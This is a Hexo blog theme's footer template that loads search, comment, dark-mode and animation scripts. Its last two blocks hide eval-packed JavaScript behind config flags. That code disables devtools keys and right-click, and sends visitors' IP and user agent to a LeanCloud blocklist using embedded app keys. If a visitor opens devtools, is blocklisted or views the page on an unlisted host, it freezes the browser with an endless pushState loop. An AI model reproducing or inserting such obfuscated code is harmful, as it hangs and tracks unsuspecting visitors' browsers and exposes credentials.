<%- js('https://cdn.jsdelivr.net/npm/jquery@3.4/dist/jquery.min.js') %>
<script>
window.addEventListener('load', () =>{
  quicklink.listen();
});
</script>

<% if (theme.search && theme.search.enable) { %>
  <script>
    <% if(theme.search.service === 'baidu') { %>
      var BAIDU_API_ID = "<%- theme.search.baidu.apiId %>";
    <%} else if(theme.search.service === 'algolia') { %>
      var ALGOLIA_API_KEY = "<%- theme.search.algolia.apiKey %>";
      var ALGOLIA_APP_ID = "<%- theme.search.algolia.applicationID %>";
      var ALGOLIA_INDEX_NAME = "<%- theme.search.algolia.indexName %>";
    <%} else if(theme.search.service === 'azure') { %>
      var AZURE_QUERY_KEY = "<%- theme.search.azure.queryKey %>";
      var AZURE_INDEX_NAME = "<%- theme.search.azure.indexName %>";
      var AZURE_SERVICE_NAME = "<%- theme.search.azure.serviceName %>";
    <%} else if(theme.search.service === 'google') { %>
      var GOOGLE_CUSTOM_SEARCH_API_KEY = "<%- theme.search.google.apiKey %>";
      var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "<%- theme.search.google.engineId %>";
    <%}%>
    var SEARCH_SERVICE = "<%- theme.search.service %>" || "hexo";
    var ROOT = "<%- config.root %>" || "/";
    if (!ROOT.endsWith('/')) ROOT += '/';
  </script>
<% } %>

<% if (theme.plugins.Artitalk && theme.plugins.Artitalk.enable && page.layout == "artitalk") { %>
  <script>
    var appID ="<%=  theme.plugins.Artitalk.appID  %>";
    var appKEY ="<%=  theme.plugins.Artitalk.appKEY  %>";
    <% if(theme.plugins.Artitalk.severurl){ %>
        var severurl="<%=  theme.plugins.Artitalk.severurl  %>";
    <% } %>
    <% if(theme.plugins.Artitalk.slanguage){ %>
        var slanguage="<%=  theme.plugins.Artitalk.slanguage  %>";
    <% } %>
    <% if(theme.plugins.Artitalk.per){ %>
        var per="<%=  theme.plugins.Artitalk.per  %>";
    <% } %>
    <% if(theme.plugins.Artitalk.placeholder1){ %>
        var placeholder1="<%=  theme.plugins.Artitalk.placeholder1  %>";
    <% } %>
    <% if(theme.plugins.Artitalk.placeholder2){ %>
        var placeholder2="<%=  theme.plugins.Artitalk.placeholder2  %>";
    <% } %>
    <% if(theme.plugins.Artitalk.lazy==0){ %>
        var lazy=0;
    <% }else{ %>
        var lazy=1;
    <% }  %>
    <% if(theme.plugins.Artitalk.bgimg){ %>
        var bgimg="<%=  theme.plugins.Artitalk.bgimg  %>";
    <% } %>
    <% if(theme.plugins.Artitalk.color1){ %>
        var color1="<%=  theme.plugins.Artitalk.color1  %>";
    <% } %>
    <% if(theme.plugins.Artitalk.color2){ %>
        var color2="<%=  theme.plugins.Artitalk.color2  %>";
    <% } %>
    <% if(theme.plugins.Artitalk.color3){ %>
        var color3="<%=  theme.plugins.Artitalk.color3  %>";
    <% } %>
  </script>
  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/artitalk"></script>
<% } %>

<% if (theme.plugins.instant_page) { %>
  <script async src="<%- theme.plugins.instant_page %>" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
<% } %>
<% if (theme.plugins.scrollreveal && theme.plugins.scrollreveal.js) { %>
  <script aysc src="<%- theme.plugins.scrollreveal.js %>"></script>
  <script type="text/javascript">
    $(function() {
      ScrollReveal().reveal('.l_main .reveal', {
        distance: '<%- theme.plugins.scrollreveal.distance %>',
        duration: '<%- theme.plugins.scrollreveal.duration %>',
        interval: '<%- theme.plugins.scrollreveal.interval %>',
        scale: '<%- theme.plugins.scrollreveal.scale %>'
      });
    });
  </script>
<% } %>
<% if (theme.plugins.nodewaves && theme.plugins.nodewaves.js) { %>
  <%- js({src: theme.plugins.nodewaves.js,aysc:true}) %>
  <script type="text/javascript">
    $(function() {
      Waves.attach('.flat-btn', ['waves-button']);
      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
      Waves.attach('.flat-box', ['waves-block']);
      Waves.attach('.float-box', ['waves-block', 'waves-float']);
      Waves.attach('.waves-image');
      Waves.init();
    });
  </script>
<% } %>


<!--无许处理 - 确认兼容-->
<% if (theme.plugins.backstretch && theme.plugins.backstretch.enable && (theme.plugins.backstretch.images || page.images)) { %>
  <% var imgs = theme.plugins.backstretch.images || page.images; %>
  <% var posi = null;
  if (theme.plugins.backstretch.position == 'cover') {
    posi = '.cover';
  }
   %>
  <% if (imgs != undefined && theme.plugins.backstretch.position != undefined){ %>
    <%- js({src:theme.plugins.backstretch.js,aysc:true}) %>
    <script type="text/javascript">
      $(function(){
        var imgs=<%- '["' + imgs.join('", "') + '"]' %>;
        if ('<%- theme.plugins.backstretch.shuffle %>' == 'true') {
          function shuffle(arr){
            /*From countercurrent-time*/
            var n = arr.length;
            while(n--) {
              var index = Math.floor(Math.random() * n);
              var temp = arr[index];
              arr[index] = arr[n];
              arr[n] = temp;
            }
          }
          shuffle(imgs);
        }
        if ('<%- posi %>') {
          $('<%- posi %>').backstretch(
            imgs,
          {
            duration: "<%- theme.plugins.backstretch.duration %>",
            fade: "<%- theme.plugins.backstretch.fade %>"
          });
        } else {
          $.backstretch(
            imgs,
          {
            duration: "<%- theme.plugins.backstretch.duration %>",
            fade: "<%- theme.plugins.backstretch.fade %>"
          });
        }
      });
    </script>
  <% } %>
<% } %>

<!--似乎不需要处理-->
<% if (theme.plugins.aplayer && theme.plugins.aplayer.enable && theme.plugins.aplayer.js) { %>
  <% (theme.plugins.aplayer.js||[]).forEach(function(item){ %>
    <%- js({src:item,aysc:true}) %>
  <% }) %>
<% } %>

<!-- 评论 （PS：只对 valine 做了 Pjax 兼容） -->
<% if (theme.comments.service && theme.comments.service.length > 0) { %>
  <%- partial('../_third-party/comments/' + theme.comments.service + '/script') %>
<% } %>

<!-- darkmodejs -->
<% if (theme.plugins.darkmodejs.enable) { %>
  <%- js({src: theme.plugins.darkmodejs.js,aysc:true}) %>
  <script type="text/javascript">
	function getClientHeight(){
	  var clientHeight=0;
	  if(document.body.clientHeight&&document.documentElement.clientHeight){
	  var clientHeight = (document.body.clientHeight<document.documentElement.clientHeight)?document.body.clientHeight:document.documentElement.clientHeight;
	  }else{
	  var clientHeight = (document.body.clientHeight>document.documentElement.clientHeight)?document.body.clientHeight:document.documentElement.clientHeight;
	  }
	  return clientHeight;
	}
	function supportCss3(style) {
		var prefix = ['webkit', 'Moz', 'ms', 'o'],
		i,
		humpString = [],
		htmlStyle = document.documentElement.style,
		_toHumb = function (string) {
		return string.replace(/-(\w)/g, function ($0, $1) {
		return $1.toUpperCase();
		});
		};
		for (i in prefix)
		humpString.push(_toHumb(prefix[i] + '-' + style));
		humpString.push(_toHumb(style));
		for (i in humpString)
		if (humpString[i] in htmlStyle) return true;
		return false;
	};
	//配置信息
	var options = {
	  bottom: '<%- theme.plugins.darkmodejs.bottom %>',
	  right: '<%- theme.plugins.darkmodejs.right %>',
	  left: '<%- theme.plugins.darkmodejs.left %>',
	  time: '<%- theme.plugins.darkmodejs.time %>',
	  mixColor: '<%- theme.plugins.darkmodejs.mixColor %>',
	  backgroundColor: '<%- theme.plugins.darkmodejs.backgroundColor %>',
	  buttonColorDark: '<%- theme.plugins.darkmodejs.buttonColorDark %>',
	  buttonColorLight: '<%- theme.plugins.darkmodejs.buttonColorLight %>',
	  saveInCookies: <%- theme.plugins.darkmodejs.saveInCookies %>,
	  label: '<%- theme.plugins.darkmodejs.label %>',
	  autoMatchOsTheme: <%- theme.plugins.darkmodejs.autoMatchOsTheme %>
	};
	// 卡片兼容处理
	function pjax_darkmodejs(){
		if(!supportCss3('mix-blend-mode'))return;
		var checkExist2 = setInterval(function() {
		   if (typeof jQuery == 'undefined'){return;}
		   clearInterval(checkExist2);
		   var TopFlag=getClientHeight();
			$(window).scroll(function(){
				var top = $(document).scrollTop();
				if(top > TopFlag) {
					$(".darkmode-layer").css("mix-blend-mode","normal");
					$(".darkmode-layer").css("background-color","#000");
				}else{
					$(".darkmode-layer").css("mix-blend-mode","difference");
					$(".darkmode-layer").css("background-color","");
				}
			})
		}, 100);
	}
	// mix-blend-mode support?
	if(supportCss3('mix-blend-mode')){
		const darkmode = new Darkmode(options);
		darkmode.showWidget();
		pjax_darkmodejs();
	}
  </script>
<% } %>


<!-- 复制 -->
<% if (theme.plugins.clipboard && (theme.style.body.highlight.copy_btn == true)) { %>
  <%- partial('_third-party/clipboard') %>
<% } %>

<!-- scrollreveal -->
<% if (theme.plugins.scrollreveal && theme.plugins.scrollreveal.js) { %>
  <script aysc src="<%- theme.plugins.scrollreveal.js %>"></script>
  <script type="text/javascript">
    function pjax_scrollrebeal() {
      ScrollReveal().reveal('.l_main .reveal', {
        distance: '<%- theme.plugins.scrollreveal.distance %>',
        duration: '<%- theme.plugins.scrollreveal.duration %>',
        interval: '<%- theme.plugins.scrollreveal.interval %>',
        scale: '<%- theme.plugins.scrollreveal.scale %>',
        easing: 'ease-out'
      });
    }

    $(function () {
      pjax_scrollrebeal();
    });
  </script>
<% } %>
<!-- ******************************** -->

<!-- fancybox -->
<%- partial('_third-party/fancybox') %>
<!-- ******************************** -->

<% if (config.use_cdn && theme.info.cdn && theme.info.cdn.js) { %>
  <%- js(theme.info.cdn.js) %>
<% } else { %>
  <%- js(['js/min/app.min.js']) %>
<% } %>

<!--fix-->
<% if (theme.search && theme.search.enable) { %>
  <% if (theme.search.js) { %>
    <%- js({src:theme.search.js,aysc:true}) %>
  <% } else { %>
    <%- js(['js/min/search.min.js']) %>
  <% } %>
<% } %>

<% if (theme.plugins.busuanzi) { %>
  <script defer src="<%- theme.plugins.busuanzi %>" data-pjax></script>
<% } %>

<% if (theme.plugins.nodewaves && theme.plugins.nodewaves.js) { %>
  <%- js({src: theme.plugins.nodewaves.js}) %>
  <script type="text/javascript">
    $(function () {
      Waves.attach('.flat-btn', ['waves-button']);
      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
      Waves.attach('.flat-box', ['waves-block']);
      Waves.attach('.float-box', ['waves-block', 'waves-float']);
      Waves.attach('.waves-image');
      Waves.init();
    });
  </script>
<% } %>

<% if (theme.plugins.comment_typing) { %>
  <%- js({src:theme.plugins.comment_typing,aysc:true}) %>
<% } %>

<!--无需处理 ？-->
<% if (config.highlight.enable != true) { %>
  <% if (theme.plugins.highlightjs && theme.plugins.highlightjs.js) { %>
    <%- js({src:theme.plugins.highlightjs.js,aysc:true}) %>
    <script>hljs.initHighlightingOnLoad();</script>
  <% } %>
<% } %>

<% if (config.import && config.import.script){ %>
<% (config.import.script||[]).forEach(function(item){ %>
<%- item %><% }) %>
<% } %>

<script>
    var now = new Date(); 
    function SiteTime() {
	  try{
        var grt= new Date("08/19/2019 21:23:12");
        now.setTime(now.getTime()+250); 
        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 "; 
        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
	 }catch(e){}
    }
	if(typeof SiteTimeFlag=="undefined"){
		var TimeInterval=setInterval("SiteTime()",250);
		window.SiteTimeFlag=true;
	}
</script>

<% if (config.emergency) { %>
<script>
var IPBLOCK=<%= config.IPBLOCK %>;
eval(function(p,a,c,k,e,r){e=function(c){return(c<62?'':e(parseInt(c/62)))+((c=c%62)>35?String.fromCharCode(c+29):c.toString(36))};if('0'.replace(0,e)==0){while(c--)r[e(c)]=k[c];k=[function(e){return r[e]||e}];e=function(){return'([689a-cf-hj-rt-zA-EG-Z]|1\\w)'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('9 t=8[\'u\'][\'H\'];9 W=a(){t("%cWelcome to t\'s Blog"," text-shadow: 0 I 0 #ccc,0 2px 0 #c9c9c9,0 J 0 #bbb,0 4px 0 #b9b9b9,0 z 0 #aaa,0 6px I h(0,0,0,.1),0 0 z h(0,0,0,.1),0 I J h(0,0,0,.3),0 J z h(0,0,0,.2),0 z K h(0,0,0,.25),0 K K h(0,0,0,.2),0 X X h(0,0,0,.15);font-size:5em")};8[\'u\'][\'H\']=W;u.H(1);a v(){l(j){9 6="";k(9 i=0;i<m;i++){6=6+i.n();o.p(0,0,6)}}};setTimeout(a(){b(!8.w.q){l(j){9 6="";k(9 i=0;i<m;i++){6=6+i.n();o.p(0,0,6)}}}},60000);x(a(){A{Y Z=/^((25[0-5]|2[0-4]\\d|[01]?\\d\\d?)\\.){3}(25[0-5]|2[0-4]\\d|[01]?\\d\\d?)$/;Y 11=/^([\\da-fA-F]{1,4}:){7}[\\da-fA-F]{1,4}$/;9 g=8.w.B;b(g){b((!((Z.L(g))||(11.L(g))))||(g=="127.0.0.1")){8.q=1;v()};A{b(IPBLOCK.L(g)){8.q=1;v()}}C(e){}};b(8.q){l(j){9 6="";k(9 i=0;i<m;i++){6=6+i.n();o.p(0,0,6)}}}}C(e){}},M);x(a(){9 14=16.17(),y,N;k(y=0;y<1000;y++){t(y);u.18()}N=16.17()-14;b(N>300){8.q=1;v()}},500);D=c.createElement(\'D\');x(a(){t(D);u.18()});Object.defineProperty(D,"id",{19:a(){8.q=1;v()}});a 1a(e){c.all&&(2!=r.1b&&3!=r.1b||(O="f P")),c.1c&&3==e.which&&(O="f P")};x(a(){c.1d=a(e){f!1},c.1d=a(e){f!1},c.1c&&c.captureEvents(Event.MOUSEDOWN),c.onmousedown=1a,c.O=new Function("f P;"),c.onkeydown=c.onkeyup=c.onkeypress=a(){b(123==8.r.Q||73==8.r.Q||121==8.r.Q)f 8.r.returnValue=!1}},M);9 1e=x(a(){b(E R=="G")f;b(E 8.w=="G")f;b(E 8.w.B=="G")f;clearInterval(1e);b(E 8.1f===\'G\'){R.init({appId:"HIAOvtfdfuIaz1EnjsuflKrm-MdYXbMMI",appKey:"VKo9lpLdViqS2rs2cg51r3ol",serverURLs:"https://HIAOvtfd.api.lncldglobal.com"});8.1f=j};9 g=8.w.B;9 S=navigator.userAgent;A{R.Query.doCloudQuery(\'select 1g from Block where B = "\'+g+\'" and S = "\'+S+\'"\').then((a(T){A{b(T.1h&&T.1h[0].19("1g")>3){l(j){9 6="";k(9 i=0;i<m;i++){6=6+i.n();o.p(0,0,6)}}}}C(e){}}),(a(e){l(j){9 6="";k(9 i=0;i<m;i++){6=6+i.n();o.p(0,0,6)}}}))}C(e){}},M);b((8.U.V!="1i.github.io")&&(8.U.V!="localhost:4000")&&(8.U.V!="blog.1i.top")){l(j){9 6="";k(9 i=0;i<m;i++){6=6+i.n();o.p(0,0,6)}}};',[],81,'||||||total||window|var|function|if|document|||return|testip|rgba||true|for|while|1000000000000000000000000000000000000000000000|toString|history|pushState|fuck|event||MHuiG|console|kill|MV|setInterval|check|5px|try|ip|catch|div|typeof||undefined|log|1px|3px|10px|test|100|diff|oncontextmenu|false|keyCode|AV|ua|rets|location|host|fake|20px|const|IPv4reg||IPv6reg|||startTime||performance|now|clear|get|click|button|layers|onselectstart|checkBlock|disableAVInit|time|results|mhuig'.split('|'),0,{}))
</script>
<% } %>
<% if (config.block) { %>
<script>
eval(function(p,a,c,k,e,r){e=function(c){return c.toString(36)};if('0'.replace(0,e)==0){while(c--)r[e(c)]=k[c];k=[function(e){return r[e]||e}];e=function(){return'[124-9a-df-hj-u]'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('2 h=setInterval(8(){4(6 9=="7")a;4(6 5.b=="7")a;4(6 5.b.c=="7")a;clearInterval(h);4(6 5.j===\'7\'){9.init({appId:"HIAOvtfdfuIaz1EnjsuflKrm-MdYXbMMI",appKey:"VKo9lpLdViqS2rs2cg51r3ol",serverURLs:"https://HIAOvtfd.api.lncldglobal.com"});5.j=d};2 k=5.b.c;2 f=navigator.userAgent;l{9.Query.doCloudQuery(\'select m from Block where c = "\'+k+\'" and f = "\'+f+\'"\').then((8(g){l{4(g.n&&g.n[0].get("m")>3){o(d){2 1="";p(2 i=0;i<q;i++){1=1+i.r();s.t(0,0,1)}}}}u(e){}}),(8(e){o(d){2 1="";p(2 i=0;i<q;i++){1=1+i.r();s.t(0,0,1)}}}))}u(e){}},100);',[],31,'|total|var||if|window|typeof|undefined|function|AV|return|MV|ip|true||ua|rets|checkBlock||disableAVInit|testip|try|time|results|while|for|1000000000000000000000000000000000000000000000|toString|history|pushState|catch'.split('|'),0,{}))
</script>
<% } %>
<% if (config.rotateY) { %>
<script>
document.getElementsByTagName("html")[0].setAttribute('style', 'transform: rotateY(180deg);');
</script>
<% } %>
